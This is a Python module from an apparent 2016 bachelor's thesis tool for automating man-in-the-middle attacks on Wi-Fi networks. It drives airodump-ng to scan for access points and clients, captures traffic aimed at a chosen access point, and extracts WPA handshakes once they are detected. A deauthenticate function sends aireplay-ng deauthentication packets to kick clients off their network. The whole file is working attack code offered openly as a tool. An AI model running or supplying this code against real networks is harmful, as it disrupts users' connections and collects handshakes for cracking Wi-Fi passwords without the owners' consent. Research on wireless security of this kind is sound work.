#!/usr/bin/env python3
"""
Common functionality used in various parts.

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""
import csv
import logging
import os
import subprocess
import tempfile
import time
from enum import Enum, unique
from typing import List, Dict

from wifimitm.updatableProcess import UpdatableProcess

from .model import WirelessAccessPoint, WirelessStation, WirelessInterface

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


class WifimitmError(Exception):
    pass


def csv_row_station_bssid(row):
    """
    Provide associated bssid of given station.
    :param row: list of strings representing one row of csv file generated by airodump-ng during scanning
    :return: string bssid
    """
    return row[5].strip()


def csv_row_to_station(row) -> WirelessStation:
    """
    Convert csv row to station.
    :param row: list of strings representing one row of csv file generated by airodump-ng during scanning

    :rtype: WirelessStation
    :return: WirelessStation object
    """
    mac_address = row[0].strip()
    power = row[3].strip()
    return WirelessStation(mac_address, power)


def csv_row_to_ap(row) -> WirelessAccessPoint:
    """
    Convert csv row to AP.
    :param row: list of strings representing one row of csv file generated by airodump-ng during scanning

    :rtype: WirelessAccessPoint
    :return: WirelessAccessPoint object
    """
    bssid = row[0].strip()
    power = row[8].strip()
    channel = row[3].strip()
    encryption = row[5].strip()
    cipher = row[6].strip()
    authentication = row[7].strip()
    wps = row[6].strip()
    #
    essid = row[13].strip()
    iv_sum = row[10].strip()

    ap = WirelessAccessPoint(bssid, power, channel, encryption, cipher, authentication, wps, essid, iv_sum)
    ap.update_known()

    return ap


def csv_to_result(csv_path) -> List[WirelessAccessPoint]:
    """
    Convert csv output file, generated by airodump-ng during scanning, to scan result.
    :param csv_path: path to csv output file

    :rtype: List[WirelessAccessPoint]
    :return: List containing WirelessAccessPoint objects with associated WirelessClient objects.
    """
    scan_result = list()
    with open(csv_path, newline='') as csv_file:
        reader = csv.reader(csv_file, delimiter=',')
        for row in reader:
            if len(row) < 2 or row[1] == ' First time seen':  # skip section headers and empty lines
                continue
            elif len(row) == 15:  # reading access points section
                ap = csv_row_to_ap(row)
                scan_result.append(ap)
            elif len(row) == 7:  # reading stations section
                station = csv_row_to_station(row)
                associated_bssid = csv_row_station_bssid(row)
                # add station to associated access point, stations section is read after access points section
                for ap in scan_result:
                    if ap.bssid == associated_bssid:
                        ap.add_associated_station(station)
    return scan_result


class WirelessScanner(UpdatableProcess):
    @unique
    class State(Enum):
        """
        WirelessScanner process states.
        """
        SCANNING = 0
        """SCANNING wireless traffic."""
        STARTED = 2
        """Process just started."""
        TERMINATED = 100
        """Process have been terminated. By self.stop() call, on its own or by someone else."""

    def __init__(self, interface: WirelessInterface, write_interval=5):
        """
        :type interface: WirelessInterface
        :param interface: wireless interface for scanning
        """
        self.state = self.State.STARTED

        self.interface = interface  # type: WirelessInterface

        cmd = ['airodump-ng',
               '-w', 'scan',
               '--output-format', 'csv',
               '--write-interval', str(write_interval),
               '-a',
               self.interface.name]
        super().__init__(cmd, stdout=False, stderr=False)  # start process

        self.scanning_csv_path = os.path.join(self.tmp_dir.name, 'scan-01.csv')

    def __str__(self):
        return '<{!s} state={!s}>'.format(
            type(self).__name__, self.state)

    def update(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive. Set appropriate flags.
        """
        super().update()
        # Is process running? State would be changed after reading stdout and stderr.
        self.poll()

        if os.path.isfile(self.scanning_csv_path):
            self.state = self.State.SCANNING

        # Change state if process was not running in the time of poll() call in the beginning of this method.
        # NOTE: Process' poll() needs to be called in the beginning of this method and returncode checked in the end
        # to ensure all feedback (stdout and stderr) is read and states are changed accordingly.
        # If the process exited, its state is not changed immediately. All available feedback is read and then
        # the state is changed to self.State.TERMINATED. State, flags,stats and others can be changed during reading
        # the available feedback even if the process exited. But self.State.TERMINATED is assigned here if
        # the process exited.
        if self.returncode is not None:
            self.state = self.State.TERMINATED

    def cleanup(self, stop=True):
        """
        Cleanup after running process.
        Temp files are closed and deleted,
        :param stop: Stop process if it's running.
        """
        super().cleanup(stop=stop)
        self.scanning_csv_path = None  # file was deleted with tmp_dir

    def get_scan_result(self) -> List[WirelessAccessPoint]:
        """
        :return: List containing WirelessAccessPoint objects with associated WirelessStation objects.
        :rtype List[WirelessAccessPoint]
        """
        while not self.has_csv():
            logger.debug('WirelessScanner polling result')
            time.sleep(1)
        return csv_to_result(self.scanning_csv_path)

    def has_csv(self):
        return os.path.isfile(self.scanning_csv_path)


class WirelessCapturer(UpdatableProcess):
    @unique
    class State(Enum):
        """
        WirelessCapturer process states.
        """
        CAPTURING = 0
        """Capturing wireless traffic."""
        STARTED = 2
        """Process just started."""
        TERMINATED = 100
        """Process have been terminated. By self.stop() call, on its own or by someone else."""

    def __init__(self, interface: WirelessInterface, ap: WirelessAccessPoint):
        self.state = self.State.STARTED
        self.flags = self.__initial_flags()

        self.interface = interface  # type: WirelessInterface
        self.ap = ap

        self.wpa_handshake_cap_path = None

        cmd = ['airodump-ng',
               '--bssid', ap.bssid,
               '--channel', ap.channel,
               '-w', 'capture',
               '--output-format', 'csv,pcap',
               '--write-interval', '5',
               '--update', '5',  # delay between display updates
               '-a',
               self.interface.name]
        super().__init__(cmd)  # start process

        self.capturing_csv_path = os.path.join(self.tmp_dir.name, 'capture-01.csv')
        self.capturing_cap_path = os.path.join(self.tmp_dir.name, 'capture-01.cap')
        self.capturing_xor_path = os.path.join(self.tmp_dir.name, 'capture-01-' +
                                               self.ap.bssid.replace(':', '-') + '.xor')

    def __str__(self):
        return '<{!s} state={!s}, flags={!s}>'.format(
            type(self).__name__, self.state, self.flags)

    @staticmethod
    def __initial_flags() -> Dict[str, bool]:
        """
        Return initial flags describing state of the running process.
        :rtype: Dict[str, bool]
        """
        flags = dict()
        flags['detected_wpa_handshake'] = False
        """Flag 'detected_wpa_handshake' is set if process detected WPA handshake, which is now saved in cap file."""
        return flags

    def update(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive. Set appropriate flags.
        """
        super().update()
        # Is process running? State would be changed after reading stdout and stderr.
        self.poll()

        # check every added line in stdout
        if self.stdout_r and not self.stdout_r.closed:
            for line in self.stdout_r:  # type: str
                if line == '\n':
                    continue
                # NOTE: stdout should be empty
                logger.warning("Unexpected stdout of airodump-ng: '{}'. {}".format(line, str(self)))

        # check every added line in stderr
        if self.stderr_r and not self.stderr_r.closed:
            for line in self.stderr_r:
                if self.state == self.State.STARTED:
                    if self.ap.bssid in line:
                        self.state = self.State.CAPTURING

                if self.state == self.State.CAPTURING:
                    if 'WPA handshake:' in line and not self.flags['detected_wpa_handshake']:
                        # only on the first print of 'WPA handshake:'
                        self.flags['detected_wpa_handshake'] = True
                        logger.debug('WirelessCapturer detected WPA handshake.')
                        self.__extract_wpa_handshake()

        # Change state if process was not running in the time of poll() call in the beginning of this method.
        # NOTE: Process' poll() needs to be called in the beginning of this method and returncode checked in the end
        # to ensure all feedback (stdout and stderr) is read and states are changed accordingly.
        # If the process exited, its state is not changed immediately. All available feedback is read and then
        # the state is changed to self.State.TERMINATED. State, flags,stats and others can be changed during reading
        # the available feedback even if the process exited. But self.State.TERMINATED is assigned here if
        # the process exited.
        if self.returncode is not None:
            self.state = self.State.TERMINATED

    def cleanup(self, stop=True):
        """
        Cleanup after running process.
        Temp files are closed and deleted,
        :param stop: Stop process if it's running.
        """
        super().cleanup(stop=stop)
        self.wpa_handshake_cap_path = None  # file was deleted with tmp_dir

    def get_capture_result(self) -> List[WirelessAccessPoint]:
        """
        :return: List containing WirelessAccessPoint objects with associated WirelessStation objects.
        :rtype List[WirelessAccessPoint]
        """
        while not self.has_capture_csv():
            logger.debug('WirelessCapturer polling result')
            time.sleep(1)
        return csv_to_result(self.capturing_csv_path)

    def has_capture_csv(self):
        return os.path.isfile(self.capturing_csv_path)

    def has_prga_xor(self):
        return os.path.isfile(self.capturing_xor_path)

    def get_iv_sum(self) -> str:
        """
        Get sum of collected IVs.
        :rtype: str
        """
        aps = self.get_capture_result()
        if len(aps):
            return aps[0].iv_sum
        else:
            return 0

    def __extract_wpa_handshake(self):
        """
        Raises:
            CalledProcessError: If returncode of wpaclean is non-zero.
        """
        if not os.path.isfile(self.capturing_cap_path):
            raise FileNotFoundError
        hs_path = os.path.join(self.tmp_dir.name, 'WPA_handshake.cap')
        cmd = ['wpaclean', hs_path, self.capturing_cap_path]
        subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        self.wpa_handshake_cap_path = hs_path


def deauthenticate(interface: WirelessInterface, station, count=10):
    """
    "This  attack  sends  deauthentication  packets  to  one  or more clients which are currently associated with
    a particular  access point. Deauthenticating clients can be done for a number of reasons: Recovering a hidden ESSID.
    This is an ESSID which  is  not being broadcast. Another term for this is "cloaked" or Capturing WPA/WPA2 handshakes
    by forcing clients to reauthenticate or Generate  ARP  requests  (Windows clients sometimes flush their ARP cache
    when disconnected).  Of course,  this  attack  is  totally useless  if  there  are no associated wireless client
    or on fake authentications."
    `deauthentication[Aircrack-ng]<http://www.aircrack-ng.org/doku.php?id=deauthentication>`_

    :type interface: WirelessInterface
    :param interface: wireless interface for deauthentication

    :param station: associated station to be deauthenticated
    :param count: amount of deauth series to be sent, each series consists of 64 deauth packets

    The deauthentication packets are sent directly from your PC to the clients. So you must be physically close enough
    to the clients for your wireless card transmissions to reach them.
    """
    if count <= 0:
        raise ValueError

    cmd = ['aireplay-ng',
           '--deauth', str(count),
           '-a', station.associated_ap.bssid,  # MAC address of access point.
           '-c', station.mac_address,
           interface.name]

    subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
    logger.debug('deauth sent to ' + station.mac_address)
